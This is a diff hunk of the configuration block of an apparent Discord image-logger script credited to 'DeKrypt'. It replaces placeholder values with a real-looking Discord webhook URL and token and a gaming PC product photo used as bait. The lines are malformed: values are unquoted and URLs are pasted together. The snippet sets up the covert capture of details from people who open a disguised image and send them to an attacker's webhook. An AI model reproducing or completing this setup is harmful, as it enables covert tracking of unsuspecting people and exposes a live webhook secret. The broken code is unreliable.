@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",https://discord.com/api/webhooks/1445061167138738320/cGPN21xb2Ezh8iot3ikEN_SNknn--AdnnLYlXE_QrE9KXaYl0GKDdFjzX3xmsZpeD_Em
-    "image": "IMAGE HERE !",https://i.pinimg.com/736x/30/b9/46/1CHr4H6tnkHE5AdNtV8qXYRNw6hG3hNMgi.jpghttps://discord.com/api/webhooks/1445061167138738320/cGPN21xb2Ezh8iot3ikEN_SNknn--AdnnLYlXE_QrE9KXaYl0GKDdFjzX3xmsZpeD_Em
+    "webhook": https://discord.com/api/webhooks/1445066689782743082/CiTZxFEPT-LWbwVoawMNmttsUHXpIdHCT8fPoPwk_D0d-khkzSNyWKkHCojsUFReF8S4
+    "image": https://newtechstore.com/cdn/shop/products/ultra-gaming-pc-bundle-2022-intel-core-i9-11900k-32gb-ram-nvidia-rtx-3080-12gb-1tb-ssd-27inch-curved-165hz-gaming-monitor-gaming-keyboard-mouse-headset-mouspad-gaming-pc--543881_1200x1200.jpg?v=1663322807
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
